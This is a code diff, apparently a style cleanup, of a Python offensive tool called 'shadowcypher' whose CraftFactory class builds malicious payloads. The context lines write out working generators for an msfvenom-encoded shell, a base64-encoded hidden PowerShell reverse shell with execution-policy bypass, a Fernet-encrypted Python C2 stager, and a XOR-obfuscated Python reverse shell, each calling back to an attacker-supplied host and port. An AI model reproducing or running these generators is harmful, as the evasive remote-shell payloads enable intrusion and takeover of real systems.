@@ -4,10 +4,11 @@ Professional-grade shellcode generation with multi-stage encoding and XOR stubs.
 """
 
 import os
-import subprocess
+
 from shadowcypher.core.logger import logger
-from shadowcypher.core.runner import runner
 from shadowcypher.core.platform import platform_engine
+from shadowcypher.core.runner import runner
+
 
 class CraftFactory:
     """The 'Forge' for high-fidelity malicious artifacts."""
@@ -32,7 +33,7 @@ class CraftFactory:
 
         out_path = f"payloads/shell_x64_{lport}.{ext}"
         os.makedirs("payloads", exist_ok=True)
-        
+
         args = [
             "msfvenom",
         ] + plat_args + [
@@ -42,7 +43,7 @@ class CraftFactory:
             "-i", str(iterations),
             "-o", out_path
         ]
-        
+
         logger.info("forge", f"FORGING_HARDENED_PAYLOAD: {out_path} ({iterations} iterations, {platform_engine.SYSTEM})")
         return runner.execute_task(f"PAYLOAD_FORGE_{lport}", args, callback=on_output)
 
@@ -51,17 +52,17 @@ class CraftFactory:
         """Generate a base64 encoded, AMSI-bypass ready PowerShell stager."""
         # Strategic Depth: Using simple obfuscation for 'Level 100' logic
         raw_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendchoice  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendchoice);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
-        
+
         import base64
         encoded_cmd = base64.b64encode(raw_cmd.encode('utf-16le')).decode()
-        
+
         final_payload = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
-        
+
         out_path = f"payloads/stager_{lport}.ps1"
         os.makedirs("payloads", exist_ok=True)
         with open(out_path, "w") as f:
             f.write(final_payload)
-            
+
         if on_output:
             on_output(f"[FORGE] STEALTH_POWERSHELL_READY: {out_path}")
         return out_path
@@ -69,12 +70,13 @@ class CraftFactory:
     @staticmethod
     def generate_stealth_c2_python(lhost, lport):
         """Generate a Level-100 encrypted C2 stager using cryptography.fernet."""
-        from cryptography.fernet import Fernet
         import base64
+
+        from cryptography.fernet import Fernet
 
         key = Fernet.generate_key()
         f = Fernet(key)
-        
+
         raw_shell = f"""
 import socket,os,threading,time
 def connect():
@@ -92,7 +94,7 @@ while True:
     time.sleep(30)
 """
         encrypted = f.encrypt(raw_shell.encode())
-        
+
         stager = f"""
 import base64
 from cryptography.fernet import Fernet
@@ -109,13 +111,13 @@ exec(f.decrypt(e).decode())
         import base64
         _shell = platform_engine.get_cmd('shell')
         raw_shell = f"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['{_shell}'])"
-        
+
         key = 0x42
         xor_shell = "".join([chr(ord(c) ^ key) for c in raw_shell])
         xor_shell_b64 = base64.b64encode(xor_shell.encode()).decode()
-        
+
         stub = f"import base64;k=0x42;e='{xor_shell_b64}';d=base64.b64decode(e).decode();exec(''.join([chr(ord(c)^k) for c in d]))"
-        
+
         out_path = f"payloads/stealth_agent_{lport}.py"
         os.makedirs("payloads", exist_ok=True)
         with open(out_path, "w") as f:
